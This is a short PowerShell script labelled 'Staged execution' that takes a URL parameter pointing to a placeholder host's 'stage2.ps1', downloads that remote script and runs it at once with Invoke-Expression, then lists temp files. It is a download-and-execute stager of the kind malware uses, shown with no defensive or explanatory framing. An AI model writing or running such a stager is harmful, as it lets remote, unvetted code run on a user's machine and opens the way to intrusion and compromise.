<# Staged execution #>
[CmdletBinding()]
param(
    [string]$Stage1Url = "http://contoso.com:80/stage2.ps1",
    [int]$TimeoutSec = 40
)
IEX (Invoke-WebRequest -Uri $Stage1Url -UseBasicParsing).Content
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
